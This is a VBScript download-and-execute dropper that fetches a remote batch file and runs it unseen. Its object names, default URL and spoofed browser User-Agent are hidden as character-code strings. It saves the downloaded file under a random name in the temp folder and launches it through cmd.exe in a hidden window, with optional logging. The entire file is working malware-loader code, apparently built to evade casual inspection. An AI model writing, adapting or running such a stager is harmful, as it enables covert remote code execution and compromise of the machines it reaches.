Option Explicit

' ---------------------------------------------------------------
'  femboy_dl_exec_sk7q.vbs
'    wscript //nologo femboy_dl_exec_sk7q.vbs [url] [savepath] [noexec] [dbg]
'  GUI subsystem host -> no console window is ever created.
' ---------------------------------------------------------------

Dim gFso, gSh, gUrl, gPath, gNoExec, gDbg, gN

Set gFso = CreateObject(Dec("83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116"))
Set gSh  = CreateObject(Dec("87,83,99,114,105,112,116,46,83,104,101,108,108"))
Randomize

gUrl    = Dec("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,97,114,115,104,115,105,110,103,104,57,57,57,57,52,53,47,101,118,101,114,121,116,104,105,110,103,45,105,115,45,97,119,101,115,111,109,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,101,109,98,111,121,46,98,97,116")
gPath   = ""
gNoExec = False
gDbg    = False

Dim a
Set a = WScript.Arguments
If a.Count >= 1 Then If Len(Trim(a(0))) > 0 Then gUrl = Trim(a(0))
If a.Count >= 2 Then If Len(Trim(a(1))) > 0 Then gPath = Trim(a(1))
If a.Count >= 3 Then If LCase(Trim(a(2))) = "noexec" Then gNoExec = True
If a.Count >= 4 Then If LCase(Trim(a(3))) = "dbg" Then gDbg = True

' local payload shortcut (file:///... or a plain path) - skip the network
Dim sLocal
sLocal = gUrl
If Len(sLocal) > 7 Then
    If LCase(Left(sLocal, 7)) = "file://" Then sLocal = Mid(sLocal, 9)
End If
sLocal = Replace(sLocal, "/", "\")

If gFso.FileExists(sLocal) Then
    gPath = sLocal
    Note "local payload: " & gPath
Else
    If Len(gPath) = 0 Then gPath = StagePath()
    Dim tryN, got
    got = False
    For tryN = 1 To 2
        If Fetch(gUrl, gPath) Then
            got = True
            Exit For
        End If
        If tryN < 2 Then WScript.Sleep 1500
    Next
    If Not got Then
        Note "fetch failed"
        WScript.Quit 1
    End If
End If

On Error Resume Next
gN = 0
gN = gFso.GetFile(gPath).Size
On Error GoTo 0

If gN < 32 Then
    Note "payload too small: " & gN
    WScript.Quit 2
End If

Note "staged " & gPath & " (" & gN & " bytes)"

If gNoExec Then
    WScript.Quit 0
End If

If Not Fire(gPath) Then
    Note "launch failed"
    WScript.Quit 3
End If

Note "launched"
WScript.Quit 0


' ---------------------------------------------------------------
Function Dec(s)
    Dim p, i, r
    p = Split(s, ",")
    r = ""
    For i = 0 To UBound(p)
        r = r & Chr(CInt(p(i)))
    Next
    Dec = r
End Function

Function StagePath()
    Dim d, h
    d = gFso.GetSpecialFolder(2)
    If Not gFso.FolderExists(d) Then d = gSh.ExpandEnvironmentStrings("%APPDATA%")
    h = Hex(Int(Rnd() * 268435456))
    h = h & Hex(Int(Rnd() * 268435456))
    StagePath = d & "\" & LCase(h) & ".cmd"
End Function

Function SaveBytes(b, sPath)
    Dim st
    SaveBytes = False
    On Error Resume Next
    Err.Clear
    Set st = CreateObject(Dec("65,68,79,68,66,46,83,116,114,101,97,109"))
    If Err.Number <> 0 Then Exit Function
    st.Type = 1
    st.Open
    st.Write b
    If gFso.FileExists(sPath) Then gFso.DeleteFile sPath, True
    st.SaveToFile sPath, 2
    st.Close
    If Err.Number = 0 Then
        If gFso.FileExists(sPath) Then SaveBytes = True
    End If
    Err.Clear
    On Error GoTo 0
End Function

Function Fetch(sUrl, sPath)
    Dim o, b, id
    Fetch = False
    On Error Resume Next

    id = Array(Dec("77,83,88,77,76,50,46,83,101,114,118,101,114,88,77,76,72,84,84,80,46,54,46,48"), Dec("87,105,110,72,116,116,112,46,87,105,110,72,116,116,112,82,101,113,117,101,115,116,46,53,46,49"))
    Dim k
    For k = 0 To UBound(id)
        Err.Clear
        Set o = Nothing
        Set o = CreateObject(id(k))
        If Err.Number = 0 Then
            If k = 0 Then
                o.setTimeouts 10000, 10000, 20000, 60000
            Else
                o.SetTimeouts 10000, 10000, 20000, 60000
            End If
            o.Open "GET", sUrl, False
            o.setRequestHeader "User-Agent", Dec("77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,41")
            o.Send
            If Err.Number = 0 Then
                If o.Status = 200 Then
                    b = o.responseBody
                    If LenB(b) > 0 Then
                        If SaveBytes(b, sPath) Then Fetch = True
                    End If
                End If
            End If
        End If
        Err.Clear
        If Fetch Then Exit For
    Next

    On Error GoTo 0
End Function

Function Fire(sPath)
    Dim cm, cs
    Fire = False
    On Error Resume Next
    Err.Clear
    cs = gSh.ExpandEnvironmentStrings("%ComSpec%")
    If Len(cs) = 0 Then cs = Dec("99,109,100,46,101,120,101")
    gSh.CurrentDirectory = gFso.GetParentFolderName(sPath)
    cm = cs & " /c " & Chr(34) & Chr(34) & sPath & Chr(34) & Chr(34)
    gSh.Run cm, 0, False
    If Err.Number = 0 Then Fire = True
    Err.Clear
    On Error GoTo 0
End Function

Sub Note(sMsg)
    Dim ts, f
    If Not gDbg Then Exit Sub
    On Error Resume Next
    f = gFso.GetSpecialFolder(2) & "\femboy_dl_exec_sk7q_wrap.log"
    Set ts = gFso.OpenTextFile(f, 8, True)
    ts.WriteLine Now & "  " & sMsg
    ts.Close
    Err.Clear
    On Error GoTo 0
End Sub
